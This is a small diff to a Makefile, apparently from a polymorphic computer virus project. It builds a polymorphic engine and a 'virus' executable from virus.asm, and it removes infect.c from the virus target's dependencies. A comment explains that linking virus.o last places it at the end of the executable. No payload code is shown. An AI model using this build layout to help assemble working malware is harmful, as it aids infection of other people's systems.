@@ -48,7 +48,7 @@ polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 
 # this is really important, when virus.o is put at the last then it will be placed last in the resulting executable
-virus: infect.c polymorphicengine.c polymorphicengine.o libobjdata.a virus.o -lobjdata -lbfd 
+virus:  polymorphicengine.o polymorphicengine.c libobjdata.a virus.o -lobjdata -lbfd 
 	$(CC) $(KFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
